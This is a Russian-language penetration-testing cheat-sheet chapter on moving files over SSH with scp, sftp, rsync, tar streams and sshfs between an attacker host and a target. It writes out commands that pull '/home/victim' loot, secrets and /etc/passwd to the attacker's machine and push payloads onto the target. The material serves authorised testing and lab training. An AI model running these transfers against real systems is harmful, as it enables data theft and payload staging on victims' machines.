# 06 - SCP / SFTP

> [← README](../../README_RU.md) · [Следующий раздел →](07-netcat.md)

Передача файлов поверх SSH. Нужен SSH-доступ и `sshd` на той стороне, к которой подключаемся. Шифрование уже есть, отдельный сервер поднимать не нужно.

Есть два сценария. Дальше они разобраны отдельно, чтобы не путать направления.

| Сценарий | Где `sshd` | Откуда запускаем команду |
|---|---|---|
| Обычный | на цели (`RHOST`) | с атакующего (`LHOST`) |
| Обратный | на атакующем (`LHOST`) | с цели (`RHOST`) |

> **Windows 10+:** клиент OpenSSH (`scp.exe`, `sftp.exe`) обычно уже установлен. Синтаксис тот же, что на Linux. Альтернативы: PuTTY (`pscp.exe`, `psftp.exe`) и WinSCP.

> **SSH-учётки:** задайте `LHOST_user` / `RHOST_user` перед командами ниже (полный блок переменных — в конце раздела): `export LHOST_user=user RHOST_user=user`. См. [переменные в README](../../README_RU.md#обозначения-и-переменные).

---

## Навигация

|  |  |
|---|---|
| [1. Обычный случай: sshd на RHOST](#1-обычный-случай-sshd-на-rhost) | [2. Обратный случай: sshd на LHOST](#2-обратный-случай-sshd-на-lhost) |
| [3. SFTP](#3-sftp) | [4. rsync поверх SSH](#4-rsync-поверх-ssh) |
| [5. Поток через ssh и tar](#5-поток-через-ssh-и-tar) | [6. sshfs](#6-sshfs) |
| [7. Диагностика](#7-диагностика) |  |

---

## 1. Обычный случай: sshd на RHOST

Команды выполняются **на LHOST**. `sshd` поднят на цели, подключаемся как `$RHOST_user@$RHOST`.

### LHOST → RHOST: залить файл на цель

```bash
scp /path/to/payload.sh $RHOST_user@$RHOST:/tmp/payload.sh
```

Каталог целиком:

```bash
scp -r /path/to/dir $RHOST_user@$RHOST:/tmp/
```

### RHOST → LHOST: забрать файл с цели

```bash
scp $RHOST_user@$RHOST:/etc/passwd /tmp/passwd
```

Каталог целиком:

```bash
scp -r $RHOST_user@$RHOST:/home/victim/loot /tmp/loot
```

### Полезные флаги

```bash
# нестандартный порт SSH: у scp это -P, заглавная
scp -P 2222 file $RHOST_user@$RHOST:/tmp/

# по ключу
scp -i ~/.ssh/id_rsa file $RHOST_user@$RHOST:/tmp/

# сжатие на медленном канале
scp -C largefile $RHOST_user@$RHOST:/tmp/

# ограничить скорость, Кбит/с
scp -l 1000 largefile $RHOST_user@$RHOST:/tmp/

# лаборатория: не проверять host key
scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  file $RHOST_user@$RHOST:/tmp/

# старый сервер не понимает SFTP-режим scp
scp -O file $RHOST_user@$RHOST:/tmp/
```

### Windows-клиент

OpenSSH в PowerShell/CMD:

```powershell
# LHOST -> RHOST
scp C:\Users\Public\payload.exe ${RHOST_user}@${RHOST}:/tmp/payload.exe

# RHOST -> LHOST
scp ${RHOST_user}@${RHOST}:/path/loot.zip C:\Users\Public\loot.zip
```

PuTTY `pscp.exe`:

```cmd
:: LHOST -> RHOST
pscp.exe -pw SecurePass123 C:\Users\Public\payload.exe %RHOST_user%@%RHOST%:/tmp/payload.exe

:: RHOST -> LHOST
pscp.exe -pw SecurePass123 %RHOST_user%@%RHOST%:/path/loot.zip C:\Users\Public\loot.zip
```

> `-pw` оставляет пароль в истории и списке процессов. Для реальной работы лучше ключи.

---

## 2. Обратный случай: sshd на LHOST

Команды выполняются **на RHOST**. `sshd` поднят на атакующем, подключаемся как `$LHOST_user@$LHOST`.

### RHOST → LHOST: вытащить файл на атакующего

```bash
scp /home/victim/secrets.zip $LHOST_user@$LHOST:/tmp/secrets.zip
```

### LHOST → RHOST: доставить файл на цель

```bash
scp $LHOST_user@$LHOST:/tmp/payload.sh /tmp/payload.sh
```

> Это тот же `scp`, просто смотрим на направление со стороны цели. Главное — не перепутать, где запущена команда и где поднят `sshd`.

---

## 3. SFTP

Интерактивный клиент. Удобен, когда нужно посмотреть каталоги и выбрать файлы.

### Подключение

Обычный случай — `sshd` на цели, командуем с LHOST:

```bash
sftp $RHOST_user@$RHOST
```

Нестандартный порт:

```bash
sftp -P 2222 $RHOST_user@$RHOST
```

По ключу:

```bash
sftp -i ~/.ssh/id_rsa $RHOST_user@$RHOST
```

### Команды внутри сессии

```text
ls                  # файлы на удалённой стороне
cd /tmp             # перейти в удалённый каталог

lls                 # файлы на локальной стороне
lcd /home/victim    # перейти в локальный каталог

get payload.sh      # RHOST -> LHOST
get -r loot         # RHOST -> LHOST, каталог

put /etc/passwd     # LHOST -> RHOST
put -r ./loot       # LHOST -> RHOST, каталог

mkdir loot
bye
```

Направления `get`/`put` зависят от того, к какой стороне мы подключились:

| Где `sshd` | `get` | `put` |
|---|---|---|
| на RHOST | RHOST → LHOST | LHOST → RHOST |
| на LHOST | LHOST → RHOST | RHOST → LHOST |

### Batch-режим

Файл `sftp_batch.txt`:

```text
get payload.exe
put /etc/passwd
bye
```

Выполнить:

```bash
sftp -b sftp_batch.txt $RHOST_user@$RHOST
```

Одна команда через stdin:

```bash
echo "get payload.exe" | sftp $RHOST_user@$RHOST
```

---

## 4. rsync поверх SSH

Лучший вариант для больших каталогов: докачивает, синхронизирует, сжимает.

Обычный случай — `sshd` на RHOST, командуем с LHOST.

```bash
# RHOST -> LHOST
rsync -avz $RHOST_user@$RHOST:/home/victim/loot /tmp/loot

# LHOST -> RHOST
rsync -avz /home/victim/loot $RHOST_user@$RHOST:/tmp/loot
```

Нестандартный порт:

```bash
rsync -avz -e "ssh -p 2222" \
  $RHOST_user@$RHOST:/home/victim/loot /tmp/loot
```

Свой ключ и отключение host-key проверки:

```bash
rsync -avz -e "ssh -i ~/.ssh/id_rsa -o StrictHostKeyChecking=no" \
  /home/victim/loot $RHOST_user@$RHOST:/tmp/loot
```

Только показать, что изменится:

```bash
rsync -avzn $RHOST_user@$RHOST:/home/victim/loot /tmp/loot
```

---

## 5. Поток через ssh и tar

Когда не нужен промежуточный архив на диске.

```bash
# RHOST -> LHOST: забрать каталог
ssh $RHOST_user@$RHOST "tar czf - /home/victim/loot" > secrets.tar.gz

# LHOST -> RHOST: отправить каталог
tar czf - /home/victim/loot | ssh $RHOST_user@$RHOST "tar xzf - -C /tmp"

# быстро забрать один файл в stdout
ssh $RHOST_user@$RHOST "cat /etc/passwd" > passwd
```

---

## 6. sshfs

Монтирует удалённую файловую систему. Удобно, когда файлов много и хочется работать с ними как с локальными.

```bash
sudo apt install -y sshfs

# смонтировать каталог цели на LHOST
sshfs $RHOST_user@$RHOST:/home/victim /mnt

# нестандартный порт
sshfs -p 2222 $RHOST_user@$RHOST:/home/victim /mnt

# отмонтировать
fusermount -u /mnt
```

---

## 7. Диагностика

```bash
# SSH-порт открыт
nc -zv $RHOST 22

# доступ и аутентификация
ssh $RHOST_user@$RHOST "id"

# подробный лог подключения
ssh -vvv $RHOST_user@$RHOST
```

Частые грабли:

- **`scp`/`sftp`: порт — это `-P`**, заглавная. Строчная `-p` у `scp` означает preserve times.
- **`ssh`/`sshfs`/`rsync -e`: порт — это `-p`**, строчная.
- **`sshd` должен быть на удалённой стороне.** Если командуем с LHOST, `sshd` нужен на RHOST. Если командуем с RHOST — на LHOST.
- **Host key prompt ломает автоматизацию.** В лаборатории: `-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null`.
- **OpenSSH 9+ использует SFTP внутри `scp`.** Со старым сервером помогает `-O`.
- **Пароль в неинтерактивном режиме** сам не вводится: нужны ключи (`ssh-keygen` + `ssh-copy-id`) или `sshpass` (небезопасно).
- **Windows-пути** в `scp.exe` указывайте как `C:\path`; при пробелах — в кавычках.
- **`rsync` может быть не установлен** на одной из сторон. Тогда `scp` или `tar` через SSH.

---

**См. также:** [01 - Attacker → Target](01-attacker-to-target.md) · [02 - Target → Attacker](02-target-to-attacker.md) · [03 - SMB](03-smb.md) · [04 - WebDAV](04-webdav.md) · [05 - FTP](05-ftp.md) · [07 - Netcat](07-netcat.md)

---

## Формы переменных

> `LHOST_user` / `RHOST_user` — учётки для SSH-команд. `LHOST` — наш ПК, `RHOST` — цель.

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
export LHOST_user=user    # учётка на нашей стороне
export RHOST_user=user    # учётка на цели
# использование: $LHOST, $RHOST, $LHOST_user, $RHOST_user
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
set LHOST_user=user
set RHOST_user=user
:: использование: %LHOST%, %RHOST%, %LHOST_user%, %RHOST_user%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
$LHOST_user = "user"
$RHOST_user = "user"
# использование: $LHOST, $RHOST, $LHOST_user, $RHOST_user
```

Подробнее - [README](../../README_RU.md#обозначения-и-переменные).

---

[← Назад к справочнику](../../README_RU.md)
